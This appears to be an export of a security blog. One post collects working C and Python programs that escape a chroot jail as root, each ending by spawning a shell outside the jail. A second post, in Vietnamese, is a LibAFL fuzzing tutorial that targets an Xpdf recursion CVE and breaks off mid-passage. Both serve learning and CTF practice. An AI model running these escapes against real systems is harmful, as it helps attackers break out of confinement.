[{"content":" 1 - GTFO Bins # List of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.\nGTFOBins\n2 - Performing Chroot inside chroot jail # Description: Need to be root inside chroot to escape from it by creating another chroot. Because 2 chroot cannot coexist (in Linux). So when create a folder and then create a new chroot inside it, will you pop out of the jail and be able to read file in fs.\nChallenge example: Challenge\ngcc available, so write a C file to perform a chroot and pop out of chrooted enviroment. We need to using C to compile chroot because normally chroot binary is not available in chrooted enviroment. Compile, upload, execute is recommended.\n#include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; //gcc break_chroot.c -o break_chroot int main(void) { mkdir(\u0026#34;chroot-dir\u0026#34;, 0755); chroot(\u0026#34;chroot-dir\u0026#34;); for(int i = 0; i \u0026lt; 1000; i++) { chdir(\u0026#34;..\u0026#34;); } chroot(\u0026#34;.\u0026#34;); system(\u0026#34;/bin/bash\u0026#34;); } #!/usr/bin/python import os os.mkdir(\u0026#34;chroot-dir\u0026#34;) os.chroot(\u0026#34;chroot-dir\u0026#34;) for i in range(1000): os.chdir(\u0026#34;..\u0026#34;) os.chroot(\u0026#34;.\u0026#34;) os.system(\u0026#34;/bin/bash\u0026#34;) The above program will:\nCreate a chroot environment. Change directory to a path relatively outside of the chroot environment. (to reach the root file system outside of chroot environment) Enter chroot to access the root file system. 3 - Root + Saved fd # Similar to the previous case, but in this case the attacker stores a file descriptor to the current directory and then creates the chroot in a new folder. Finally, as he has access to that FD outside of the chroot, he access it and he escapes.\n#include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;errno.h\u0026gt; int main(void) { mkdir(\u0026#34;tmpdir\u0026#34;, 0755); int dir_fd = open(\u0026#34;.\u0026#34;, O_RDONLY); if(chroot(\u0026#34;tmpdir\u0026#34;)){ perror(\u0026#34;chroot\u0026#34;); } fchdir(dir_fd); close(dir_fd); for(int x = 0; x \u0026lt; 1000; x++) chdir(\u0026#34;..\u0026#34;); chroot(\u0026#34;.\u0026#34;); system(\u0026#34;/bin/bash\u0026#34;); } 4 - Root + Fork + UDS (Unix Domain Sockets) # FD can be passed over Unix Domain Sockets, so:\nCreate a child process (fork) Create UDS so parent and child can talk Run chroot in child process in a different folder In parent proc, create a FD of a folder that is outside of new child proc chroot Pass to child procc that FD using the UDS Child process chdir to that FD, and because it\u0026rsquo;s ouside of its chroot, he will escape the jail #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/un.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;sys/wait.h\u0026gt; #define CHROOT_PATH \u0026#34;tmpdir\u0026#34; // Directory for chroot // Function to send FD over socket void send_fd(int socket, int fd) { struct msghdr msg = {0}; struct cmsghdr *cmsg; char buf[CMSG_SPACE(sizeof(int))]; memset(buf, 0, sizeof(buf)); struct iovec io = {.iov_base = \u0026#34;FD\u0026#34;, .iov_len = 2}; msg.msg_iov = \u0026amp;io; msg.msg_iovlen = 1; msg.msg_control = buf; msg.msg_controllen = sizeof(buf); cmsg = CMSG_FIRSTHDR(\u0026amp;msg); cmsg-\u0026gt;cmsg_level = SOL_SOCKET; cmsg-\u0026gt;cmsg_type = SCM_RIGHTS; cmsg-\u0026gt;cmsg_len = CMSG_LEN(sizeof(int)); *((int *)CMSG_DATA(cmsg)) = fd; if (sendmsg(socket, \u0026amp;msg, 0) \u0026lt; 0) { perror(\u0026#34;sendmsg\u0026#34;); exit(EXIT_FAILURE); } } // Function to receive FD from socket int receive_fd(int socket) { struct msghdr msg = {0}; struct cmsghdr *cmsg; char buf[CMSG_SPACE(sizeof(int))]; memset(buf, 0, sizeof(buf)); char dummy[2]; struct iovec io = {.iov_base = dummy, .iov_len = sizeof(dummy)}; msg.msg_iov = \u0026amp;io; msg.msg_iovlen = 1; msg.msg_control = buf; msg.msg_controllen = sizeof(buf); if (recvmsg(socket, \u0026amp;msg, 0) \u0026lt; 0) { perror(\u0026#34;recvmsg\u0026#34;); exit(EXIT_FAILURE); } cmsg = CMSG_FIRSTHDR(\u0026amp;msg); if (cmsg == NULL || cmsg-\u0026gt;cmsg_len != CMSG_LEN(sizeof(int))) { fprintf(stderr, \u0026#34;Invalid message received\\n\u0026#34;); exit(EXIT_FAILURE); } int fd = *((int *)CMSG_DATA(cmsg)); // Verify FD validity if (fcntl(fd, F_GETFD) == -1) { perror(\u0026#34;fcntl\u0026#34;); exit(EXIT_FAILURE); } return fd; } int main() { int sockpair[2]; pid_t pid; // Ensure the chroot directory exists if (mkdir(CHROOT_PATH, 0755) \u0026lt; 0 \u0026amp;\u0026amp; errno != EEXIST) { perror(\u0026#34;mkdir\u0026#34;); exit(EXIT_FAILURE); } if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockpair) \u0026lt; 0) { perror(\u0026#34;socketpair\u0026#34;); exit(EXIT_FAILURE); } pid = fork(); if (pid \u0026lt; 0) { perror(\u0026#34;fork\u0026#34;); exit(EXIT_FAILURE); } if (pid == 0) { // Child process close(sockpair[0]); // Change root to a new directory (must be root to run chroot) if (chroot(CHROOT_PATH) \u0026lt; 0) { perror(\u0026#34;chroot failed in child process\u0026#34;); exit(EXIT_FAILURE); } if (chdir(\u0026#34;/\u0026#34;) \u0026lt; 0) { perror(\u0026#34;chdir after chroot\u0026#34;); exit(EXIT_FAILURE); } printf(\u0026#34;Child: Chroot changed to %s\\n\u0026#34;, CHROOT_PATH); // Receive FD from parent int received_fd = receive_fd(sockpair[1]); printf(\u0026#34;Child: Received FD %d from parent\\n\u0026#34;, received_fd); // Escape chroot jail if (fchdir(received_fd) \u0026lt; 0) { perror(\u0026#34;fchdir\u0026#34;); exit(EXIT_FAILURE); } printf(\u0026#34;Child: Escaped chroot jail\\n\u0026#34;); for(int x = 0; x \u0026lt; 1000; x++) chdir(\u0026#34;..\u0026#34;); chroot(\u0026#34;.\u0026#34;); // Verify escape by listing current directory char cwd[1024]; if (getcwd(cwd, sizeof(cwd)) != NULL) { printf(\u0026#34;Child: Current working directory: %s\\n\u0026#34;, cwd); system(\u0026#34;/bin/bash\u0026#34;); // Optionally, open bash shell for the child } else { perror(\u0026#34;getcwd\u0026#34;); } close(sockpair[1]); } else { // Parent process close(sockpair[1]); // Open a folder outside the chroot (e.g., /) int fd = open(\u0026#34;/\u0026#34;, O_RDONLY); if (fd \u0026lt; 0) { perror(\u0026#34;open\u0026#34;); exit(EXIT_FAILURE); } printf(\u0026#34;Parent: Opened FD %d for /\\n\u0026#34;, fd); // Send FD to child send_fd(sockpair[0], fd); printf(\u0026#34;Parent: Sent FD to child\\n\u0026#34;); close(fd); close(sockpair[0]); wait(NULL); // Wait for child process to finish } return 0; } 5 - Root + Mount # Mounting root device (/) into a directory inside the chroot jail Chroot into that directory will pop you out of the box #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/mount.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #define CHROOT_PATH \u0026#34;chroot_env\u0026#34; int main() { char proc_root[256]; char target_root[256]; struct stat own_root_stat, target_root_stat; DIR *proc_dir; struct dirent *entry; int found = 0; if (mkdir(CHROOT_PATH, 0755) \u0026lt; 0 \u0026amp;\u0026amp; errno != EEXIST) { perror(\u0026#34;mkdir\u0026#34;); exit(EXIT_FAILURE); } if (chroot(CHROOT_PATH) \u0026lt; 0) { perror(\u0026#34;chroot\u0026#34;); exit(EXIT_FAILURE); } if (chdir(\u0026#34;/\u0026#34;) \u0026lt; 0) { perror(\u0026#34;chdir\u0026#34;); exit(EXIT_FAILURE); } if (mkdir(\u0026#34;/proc\u0026#34;, 0755) \u0026lt; 0 \u0026amp;\u0026amp; errno != EEXIST) { perror(\u0026#34;mkdir /proc\u0026#34;); exit(EXIT_FAILURE); } if (mount(\u0026#34;proc\u0026#34;, \u0026#34;/proc\u0026#34;, \u0026#34;proc\u0026#34;, 0, NULL) \u0026lt; 0) { perror(\u0026#34;mount /proc\u0026#34;); exit(EXIT_FAILURE); } if (stat(\u0026#34;/\u0026#34;, \u0026amp;own_root_stat) \u0026lt; 0) { perror(\u0026#34;stat /\u0026#34;); exit(EXIT_FAILURE); } proc_dir = opendir(\u0026#34;/proc\u0026#34;); if (!proc_dir) { perror(\u0026#34;opendir /proc\u0026#34;); exit(EXIT_FAILURE); } while ((entry = readdir(proc_dir)) != NULL) { if (!isdigit(entry-\u0026gt;d_name[0])) { continue; } snprintf(proc_root, sizeof(proc_root), \u0026#34;/proc/%s/root\u0026#34;, entry-\u0026gt;d_name); if (stat(proc_root, \u0026amp;target_root_stat) == 0) { if (own_root_stat.st_ino != target_root_stat.st_ino) { found = 1; snprintf(target_root, sizeof(target_root), \u0026#34;/proc/%s/root\u0026#34;, entry-\u0026gt;d_name); break; } } } closedir(proc_dir); if (!found) { fprintf(stderr, \u0026#34;No suitable PID found for escaping chroot.\\n\u0026#34;); exit(EXIT_FAILURE); } printf(\u0026#34;Using %s for escaping chroot.\\n\u0026#34;, target_root); if (chroot(target_root) \u0026lt; 0) { perror(\u0026#34;chroot to target root\u0026#34;); exit(EXIT_FAILURE); } printf(\u0026#34;Successfully escaped chroot! Current directory:\\n\u0026#34;); system(\u0026#34;ls /\u0026#34;); system(\u0026#34;/bin/bash\u0026#34;); return 0; } 6 - Root(?) + Fork # Create a Fork (child proc) and chroot into a different folder deeper in the FS and CD on it From the parent process, move the folder where the child process is in a folder previous to the chroot of the children This children process will find himself outside of the chroot #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #define CHROOT_DIR \u0026#34;chroot_env\u0026#34; #define NESTED_DIR \u0026#34;nesteddir\u0026#34; #define NEW_DIR \u0026#34;moved_out\u0026#34; // Function to move the child process to the real root int movetotheroot() { for (int i = 0; i \u0026lt; 10; i++) { if (chdir(\u0026#34;..\u0026#34;) \u0026lt; 0) { perror(\u0026#34;[Child] movetotheroot: chdir\u0026#34;); return -1; } } return 0; } int main() { pid_t pid; char child_path[256]; // Create directory structure printf(\u0026#34;[+] Creating directories...\\n\u0026#34;); mkdir(CHROOT_DIR, 0755); snprintf(child_path, sizeof(child_path), \u0026#34;/%s/%s\u0026#34;, CHROOT_DIR, NESTED_DIR); mkdir(child_path, 0755); // Fork process printf(\u0026#34;[+] Forking process...\\n\u0026#34;); pid = fork(); if (pid \u0026lt; 0) { perror(\u0026#34;fork\u0026#34;); exit(EXIT_FAILURE); } if (pid == 0) { // Child process printf(\u0026#34;[Child] Chrooting into %s...\\n\u0026#34;, CHROOT_DIR); if (chroot(CHROOT_DIR) \u0026lt; 0) { perror(\u0026#34;[Child] chroot\u0026#34;); exit(EXIT_FAILURE); } if (chdir(\u0026#34;/nesteddir\u0026#34;) \u0026lt; 0) { perror(\u0026#34;[Child] chdir\u0026#34;); exit(EXIT_FAILURE); } printf(\u0026#34;[Child] Inside chroot, sleeping...\\n\u0026#34;); sleep(2); // Wait for the parent to move the directory printf(\u0026#34;[Child] Attempting to escape chroot...\\n\u0026#34;); if (movetotheroot() \u0026lt; 0) { perror(\u0026#34;[Child] Failed to move to real root\u0026#34;); exit(EXIT_FAILURE); } if (chroot(\u0026#34;.\u0026#34;) \u0026lt; 0) { perror(\u0026#34;[Child] chroot to real root\u0026#34;); exit(EXIT_FAILURE); } printf(\u0026#34;[Child] Escaped chroot! Current directory:\\n\u0026#34;); system(\u0026#34;ls /\u0026#34;); system(\u0026#34;/bin/bash\u0026#34;); exit(EXIT_SUCCESS); } else { // Parent process sleep(1); // Wait for the child to enter chroot printf(\u0026#34;[Parent] Moving %s to %s...\\n\u0026#34;, NESTED_DIR, NEW_DIR); if (rename(child_path, NEW_DIR) \u0026lt; 0) { perror(\u0026#34;[Parent] rename\u0026#34;); exit(EXIT_FAILURE); } // Wait for the child to complete wait(NULL); printf(\u0026#34;[Parent] Cleanup complete.\\n\u0026#34;); } return 0; } ","date":"20 November 2024","externalUrl":null,"permalink":"/posts/chroot_jailbreak/","section":"Posts","summary":"Some of technique to break out of the chroot\u0026rsquo;s jail","title":"Chroot Jailbreaking","type":"posts"},{"content":"","date":"20 November 2024","externalUrl":null,"permalink":"/tags/jailbreak/","section":"Tags","summary":"","title":"Jailbreak","type":"tags"},{"content":"","date":"20 November 2024","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"20 November 2024","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"20 November 2024","externalUrl":null,"permalink":"/","section":"y198","summary":"","title":"y198","type":"page"},{"content":"","date":"27 November 2023","externalUrl":null,"permalink":"/tags/libafl/","section":"Tags","summary":"","title":"Libafl","type":"tags"},{"content":" tags: libafl # Background # Đây là lần đầu tiên mình tiếp cận với mảng fuzzing, trước đây thì mình hay reverse audit chay để tìm bug, nhưng sau khi mình chơi pwn2own làm với target source base lớn thì mình nhận ra audit chay khá là \u0026ldquo;thọt\u0026rdquo; so với các đội khác và mình quyết định sẽ thử sức với fuzzing.\nMình có hỏi sếp mình và sếp mình gợi ý cho mình học LibAFL. Về LibAFL thì vào tháng 8 năm 2021, Antonio Morales đã tạo một cái repo Fuzzing 101 với mục đích là tạo ra các challenge liên quan đến những kiến thức và basic skill của fuzzing dành cho những ai muốn học nó và sử dụng nó để tìm ra các vulnerabilities. Repo này tập trung vào cách sử dụng của AFL++ nhưng trong series mình viết với mục đích là solve những challenge sử dụng LibAFL thay vì là AFL++.\nTrong series này thì mình sẽ tìm hiểu các thư viện và viết fuzzers bằng ngôn ngữ Rust, mình sẽ cố gắng solve các challenges gần giống với solution nhất mà mình có thể làm được.\nVà trong series này mình sẽ sử dụng ngôn ngữ Rust để viết fuzzers. Nếu như bạn chưa biết Rust và Fuzzers là gì thì mình khuyến khích bạn nên tìm hiểu về nó trước khi đọc những gì tiếp theo.\nRust: Rust Book Fuzzing: What is fuzzing\nAbout LibAFL # LibAFL là một sự cải tiến từ AFL++ được viết bằng ngôn ngữ Rust. Nó nhanh hơn, đa dạng nền tảng, no_std compatibles và nó tận dụng tốt nguồn tài nguyên của máy.\nĐể hiểu rõ hơn về LibAFL bạn có thể coi cái này Fuzzers Like Lego @rC3\nObjective # Mục đích của fuzzers chúng ta lần này đó là gây ra crash và tạo PoC cho CVE-2019-13288 trong XPDF 3.02.\nIn Xpdf 4.01.01, the Parser::getObj() function in Parser.cc may cause infinite recursion via a crafted file. A remote attacker can leverage this for a DoS attack. This is similar to CVE-2018-16646.\nDựa vào mô tả của lỗ hổng thì nôm na nó chứa 1 bug có thể gây ra infinite recursion thông qua file pdf. Vậy PoC ta cần đó là tạo ra 1 file pdf có thể gây ra crash.\nPrequesite # Rust installation: # curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh\nAFL++ installation: # Dependencies: sudo apt-get update sudo apt-get install -y python3-pip cmake build-essential git gcc sudo apt-get install -y build-essential python3-dev automake cmake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptools cargo libgtk-3-dev # try to install llvm 14 and install the distro default if that fails sudo apt-get install -y lld-14 llvm-14 llvm-14-dev clang-14 || sudo apt-get install -y lld llvm llvm-dev clang sudo apt-get install -y gcc-$(gcc --version|head -n1|sed \u0026#39;s/\\..*//\u0026#39;|sed \u0026#39;s/.* //\u0026#39;)-plugin-dev libstdc++-$(gcc --version|head -n1|sed \u0026#39;s/\\..*//\u0026#39;|sed \u0026#39;s/.* //\u0026#39;)-dev sudo apt-get install -y ninja-build # for QEMU mode Build AFL++: git clone https://github.com/AFLplusplus/AFLplusplus \u0026amp;\u0026amp; cd AFLplusplus export LLVM_CONFIG=\u0026#34;llvm-config-15\u0026#34; make distrib sudo make install Nếu như bạn gặp lỗi với unicornafl thì hãy thử downgrade version của python xuống 3.10.8.\ncurl https://pyenv.run | bash pyenv install 3.10.8 pyenv global 3.10.8 Test installation: cd ~ export PATH=$PATH :~/AFLplusplus afl-fuzz -h Result:\ngh0st@pl4y-Gr0und:~$ afl-fuzz -h afl-fuzz++4.09a based on afl by Michal Zalewski and a large online community afl-fuzz [ options ] -- /path/to/fuzzed_app [ ... ] Required parameters: -i dir - input directory with test cases (or \u0026#39;-\u0026#39; to resume, also see AFL_AUTORESUME) -o dir - output directory for fuzzer findings Execution control settings: -P strategy - set fix mutation strategy: explore (focus on new coverage), exploit (focus on triggering crashes). You can also set a number of seconds after without any finds it switches to exploit mode, and back on new coverage (default: 1000) -p schedule - power schedules compute a seed\u0026#39;s performance score: fast(default), explore, exploit, seek, rare, mmopt, coe, lin quad -- see docs/FAQ.md for more information -f file - location read by the fuzzed program (default: stdin or @@) -t msec - timeout for each run (auto-scaled, default 1000 ms). Add a \u0026#39;+\u0026#39; to auto-calculate the timeout, the value being the maximum. -m megs - memory limit for child process (0 MB, 0 = no limit [default]) -O - use binary-only instrumentation (FRIDA mode) -Q - use binary-only instrumentation (QEMU mode) -U - use unicorn-based instrumentation (Unicorn mode) -W - use qemu-based instrumentation with Wine (Wine mode) -X - use VM fuzzing (NYX mode - standalone mode) -Y - use VM fuzzing (NYX mode - multiple instances mode) Mutator settings: -a - target input format, \u0026#34;text\u0026#34; or \u0026#34;binary\u0026#34; (default: generic) -g minlength - set min length of generated fuzz input (default: 1) -G maxlength - set max length of generated fuzz input (default: 1048576) -D - enable deterministic fuzzing (once per queue entry) -L minutes - use MOpt(imize) mode and set the time limit for entering the pacemaker mode (minutes of no new finds). 0 = immediately, -1 = immediately and together with normal mutation. Note: this option is usually not very effective -c program - enable CmpLog by specifying a binary compiled for it. if using QEMU/FRIDA or the fuzzing target is compiled for CmpLog then use \u0026#39;-c 0\u0026#39;. To disable Cmplog use \u0026#39;-c -\u0026#39;. -l cmplog_opts - CmpLog configuration values (e.g. \u0026#34;2ATR\u0026#34;): 1=small files, 2=larger files (default), 3=all files, A=arithmetic solving, T=transformational solving, X=extreme transform solving, R=random colorization bytes. Fuzzing behavior settings: -Z - sequential queue selection instead of weighted random -N - do not unlink the fuzzing input file (for devices etc.) -n - fuzz without instrumentation (non-instrumented mode) -x dict_file - fuzzer dictionary (see README.md, specify up to 4 times) Test settings: -s seed - use a fixed seed for the RNG -V seconds - fuzz for a specified time then terminate -E execs - fuzz for an approx. no. of total executions then terminate Note: not precise and can have several more executions. Other stuff: -M/-S id - distributed mode (-M sets -Z and disables trimming) see docs/fuzzing_in_depth.md#c-using-multiple-cores for effective recommendations for parallel fuzzing. -F path - sync to a foreign fuzzer queue directory (requires -M, can be specified up to 32 times) -T text - text banner to show on the screen -I command - execute this command/script when a new crash is found -C - crash exploration mode (the peruvian rabbit thing) -b cpu_id - bind the fuzzing process to the specified CPU core (0-...) -e ext - file extension for the fuzz test input file (if needed) To view also the supported environment variables of afl-fuzz please use \u0026#34;-hh\u0026#34;. Compiled with Python 3.11.4 module support, see docs/custom_mutators.md Compiled without AFL_PERSISTENT_RECORD support. Compiled with shmat support. For additional help please consult docs/README.md :) Setup our target # cd ~ mkdir fuzzing-101 cd fuzzing-101 cargo init fuzzing-101 sẽ là directory root cái mà lưu trữ các challenge trong project của chúng ta.\nTrong directory này chúng ta sẽ chỉnh file Cargo.toml sao cho workspace nằm ở trong directory này.\nfuzzing-101/Cargo.toml [workspace] members = [ \u0026#34;exercise-1\u0026#34;, ] [profile.release] lto = true codegen-units = 1 opt-level = 3 debug = true lto = true: Sử dụng Link-Time Optimization (tối ưu hóa thời gian liên kết). Điều này có thể cải thiện hiệu suất bằng cách tối ưu hóa toàn bộ chương trình tại thời điểm liên kết. codegen-units = 1: Đặt số lượng đơn vị mã hóa để biên dịch chương trình. Trong trường hợp này, chỉ có một đơn vị. opt-level = 3: Đặt cấp độ tối ưu hóa là 3. Cấp độ tối ưu hóa cao nhất, thường dành cho release để tối ưu hóa hiệu suất. debug = true: Bật debug information trong phiên bản release. Sau khi xong thì chúng ta tạo solution project cho challenge 1.\ncargo new exercise-1\nInstall Xpdf # Download Xpdf 3.02 # cd fuzzing-101/exercise-1 wget https://dl.xpdfreader.com/old/xpdf-3.02.tar.gz tar -xvf xpdf-3.02.tar.gz rm xpdf-3.02.tar.gz mv xpdf-3.02 xpdf Sau khi thực hiện các bước trên thì bạn sẽ có source của Xpdf 3.02 nằm trong directory xpdf\nFuzzing setup # Cargo.toml # exercise-1/cargo.toml\n[package] name = \u0026#34;exercise-one-solution\u0026#34; version = \u0026#34;0.1.0\u0026#34; edition = \u0026#34;2021\u0026#34; [dependencies] libafl = { version = \u0026#34;0.10.1\u0026#34; } Makefile.toml # exercise-1/Makefile.toml\nCó một tool khá là hay mình tìm được đó là Cargo make. Thay vì chúng ta sử dụng build như thông thường (dùng file build.rs hoặc là dùng commandline) thì chúng ta có thể sử dụng cargo make để có thể build project một cách tự động.\nInstallation:\ncargo install --force cargo-make Ví dụ để build xpdf với commandline:\ncd fuzzing-101-solutions/exercise-1/xpdf make clean rm -rf install export LLVM_CONFIG=llvm-config-15 CC=afl-clang-fast CXX=afl-clang-fast++ ./configure --prefix=./install make make install Thì chuyển sang file Makefile.toml nó sẽ như thế này\n# composite tasks [tasks.clean] dependencies = [\u0026#34;cargo-clean\u0026#34;, \u0026#34;afl-clean\u0026#34;, \u0026#34;clean-xpdf\u0026#34;] [tasks.cargo-clean] command = \u0026#34;cargo\u0026#34; args = [\u0026#34;clean\u0026#34;] [tasks.afl-clean] script = \u0026#39;\u0026#39;\u0026#39; rm -rf .cur_input* timeouts \u0026#39;\u0026#39;\u0026#39; [tasks.clean-xpdf] cwd = \u0026#34;xpdf\u0026#34; script = \u0026#34;\u0026#34;\u0026#34; make --silent clean rm -rf built-with-* ../build/* ${CARGO_MAKE_WORKING_DIRECTORY}/xpdf/install \u0026#34;\u0026#34;\u0026#34; [tasks.build] dependencies = [\u0026#34;afl-clean\u0026#34;, \u0026#34;clean-xpdf\u0026#34;, \u0026#34;build-xpdf\u0026#34;, \u0026#34;build-fuzzer\u0026#34;] [tasks.build-xpdf] cwd = \u0026#34;xpdf\u0026#34; script = \u0026#34;\u0026#34;\u0026#34; export LLVM_CONFIG=llvm-config-15 CC=afl-clang-fast CXX=afl-clang-fast++ ./configure --prefix=${CARGO_MAKE_WORKING_DIRECTORY}/xpdf/install make make install \u0026#34;\u0026#34;\u0026#34; [tasks.build-fuzzer] script = \u0026#34;\u0026#34;\u0026#34; cargo build --release \u0026#34;\u0026#34;\u0026#34; Và việc còn lại của chúng ta chỉ cần làm là\ncargo make build\nNó sẽ chạy các tác vụ bên trong nó bao gồm afl-clean, clean-xpdf, build-xpdf và build-fuzzer\n[tasks.build] dependencies = [\u0026#34;afl-clean\u0026#34;, \u0026#34;clean-xpdf\u0026#34;, \u0026#34;build-xpdf\u0026#34;, \u0026#34;build-fuzzer\u0026#34;] Sau khi chạy thành công thì chúng ta sẽ có được các binary file của xpdf\nCorpus # Corpus là nơi mà các testcases của chúng ta được lưu tại đó. Chúng ta xem các testcase là input của chúng ta, một corpus có thể lưu trữ các testcases ở nhiều dạng, có thể lưu trực tiếp trên thư mục thành file, memory,\u0026hellip;. Trong exercise-1 thì corpus sẽ lưu trữ các file pdf để có thể thực thi các file binary của xpdf.\ninstall corpus:\ncd fuzzing-101-solutions/exercise-1 mkdir corpus cd corpus wget https://github.com/mozilla/pdf.js-sample-files/raw/master/helloworld.pdf wget http://www.africau.edu/images/default/sample.pdf wget https://www.melbpc.org.au/wp-content/uploads/2017/10/small-example-pdf-file.pdf Chúng ta chỉ cần một vài sample để làm input cho fuzzer.\nFuzz Everything # Mọi thứ đã setup ok, chúng ta đi vào phần cuối, đó là viết file fuzz để tìm ra PoC gây crash.\nFile main.rs sẽ chịu trách nhiệm cho việc fuzzing, chúng ta sẽ sử dụng các component khác nhau để tiến hành fuzz. Trong file main.rs mình sử dụng concept của forkserver_simple.\nDựa vào concept trên thì component của mình sẽ bao gồm: Corpus \u0026amp; Input, Observer, Feedback, Objective, State, Monitor, EventManager, Scheduler, Fuzzer, Executor, Mutator, Stage.\nTrong main.rs mình sẽ cố gắng giải thích rõ các components mà mình sử dụng và cách nó liên kết với ý tưởng của fuzzing của mình.\n1st Component: Corpus \u0026amp; Input # Trước khi bắt đầu cho tất cả mọi thứ chúng ta cần phải xác định input và output cho fuzzing. Input ở đây đó chính là các file sample pdf trong exercise-1/corpus. Để lấy các sample trong corpus thì mình sử dụng InMemoryCorpus để tránh việc reads or writes vào trong directory, việc này sẽ cải thiện tốc độ fuzzing bằng cách ngăn chặn nó tiếp cận vào directory corpus.\nlet corpus_directory = vec![PathBuf::from(\u0026#34;./corpus\u0026#34;)]; Tiếp theo, chúng ta không thể truyền file pdf một cách trực tiếp được mà phải cần chuyển nó thành dạng dữ liệu phù hợp cho fuzzer. Ở đây mình sẽ dùng BytesInput để fuzzer có thể đọc được input và xử lý nó.\nlet corpus_BytesInput = InMemoryCorpus::\u0026lt;BytesInput\u0026gt;::new(); Output cho fuzzing hay gọi cách khác đó chính là \u0026ldquo;solutions\u0026rdquo;, nó chính là file pdf sẽ gây ra crash cho chương trình, hay nói cách khác nữa nó chính là PoC khiến cho chương trình rơi vào infinite recursion. Mình sẽ sử dụng OnDiskCorpus để lưu cái PoC đó vô trong corpus.\nlet crash_corpus = OnDiskCorpus::new(PathBuf::from(\u0026#34;./crash\u0026#34;)); Vậy là chúng ta đã xác định được input và output cho fuzzer.\n2nd Component: Observer # Theo trong libafl book thì Observer là một loại component được sử dụng để cung cấp các thông tin trong quá trình thực thi của testcase hiện tại đang được fuzz. Trong concept của forkserver_simple thì mình sẽ sử dụng TimeObserver. Như mình đã mô tả về observer ở trên thì TimeObserver nó sẽ lấy dữ liệu về runtime cho testcase đang được fuzz. Mỗi lần fuzz thì TimeObserver nó sẽ gửi giá trị về thời gian cho mỗi lần mà testcase được thực thi thông qua Feedback component (tí nữa mình sẽ nói rõ hơn về nó). Ví dụ mình có một file pdf gọi là x, và thời gian để chạy file pdftotext x tốn 5 giây thì TimeObserver sẽ lấy 5 giây đó thông qua Feedback component và gửi nó cho fuzzer.\nlet timeObserver = TimeObserver::new(\u0026#34;time\u0026#34;); Bên cạnh TimeObserver thì chúng ta cần phải có thêm Coverage Map theo như trong concept của forkserver_simple, Coverage Map sẽ được sử dụng như là coverage guided cho fuzzing, nó sẽ tập trung vào tối đa code coverage để tìm ra lỗ hổng cho chúng ta. Để có thể build Coverage Map thì chúng ta cần shared memory.\nĐầu tiên thì chúng ta cần tạo SharedMemProvider, nó sẽ cung cấp quyền truy cập vào shared memory được mapping trực tiếp vô. Chúng ta sử dụng unix shared memory trong AFL++.\nconst MAP_SIZE: usize = 65536; let mut shmem_provider = StdShMemProvider::new().unwrap(); let mut shmem = shmem_provider.new_shmem(MAP_SIZE).unwrap(); Coverage map sẽ chia sẻ lẫn nhau giữa observer và executor. Để executor biết được coverage map thì mình sẽ ghi shared memory id thì mình sẽ ghi nó vào environment.\nshmem.write_to_env(\u0026#34;__AFL_SHM_ID\u0026#34;).unwrap(); Tiếp theo chúng ta cần phải xử lý shared memory sao cho nó có thể thay đổi trong quá trình fuzzing.\nlet shmem_buf = shmem.as_mut_slice(); Và cuối cùng mình sẽ build Observer sau khi có được TimeObserver và ShareMemoryMap. Với Observer thì mình chỉ cần đưa vào giá trị của ShareMemoryMap và mình gọi nó là shared_mem (dựa vào concept của forkserver_simple).\nMình sẽ sử dụng HitCountsMapObserver. Theo như mô tả trong libafl docs thì HitCountsMapObserver cần một \u0026ldquo;base object\u0026rdquo; để làm constructor, base object mình sử dụng đó là MapObserver. Object này sẽ xác định xem trong quá trình fuzzing liệu có testcase nào \u0026ldquo;suspicious\u0026rdquo; hay không.\nlet edges_observer = unsafe { HitcountsMapObserver::new(StdMapObserver::new(\u0026#34;shared_mem\u0026#34;, shmem_buf)) }; Chúng ta đã hoàn thành Observer, đi đến phần tiếp theo.\n3rd Component: Feedback # Feedback nó giống như là output của Observer, nó sẽ xác định xem thử có outcome nào \u0026ldquo;suspicious\u0026rdquo; từ observer hay không, nếu như testcase đó có vẻ như là không ổn thì cái input được sử dụng cho lần fuzzing đó sẽ được đưa vào Corpus. Mình sẽ tạo Feedback dựa trên TimeObserver và CoverageMapObserver.\nlet mut feedback = feedback_or!( MaxMapFeedback::tracking(\u0026amp;edges_observer, true, false), TimeFeedback::with_observer(\u0026amp;timeObserver) ); Đoạn mã rust ở trên, đối với CoverageMapObserver thì mình có sử dụng MaxMapFeedback cái này được sử dụng để xác định output của HitcountsMapObserver’s coverage map, nếu như output của HitcountsMapObserver lớn hơn MAP_SIZE thì chắc chắn input của chúng ta có gì đó khiến cho nó như vậy. Đối với TimeObserver thì đơn giản mình sử dụng TimeFeedback.\nVới hai Observer ở trên, để kết hợp cả hai lại mình sử dụng logical OR, bởi vì mình chỉ cần một trong hai cái đó, nếu như outputt của HitcountsMapObserver lớn hơn so với entry của nó hoặc là 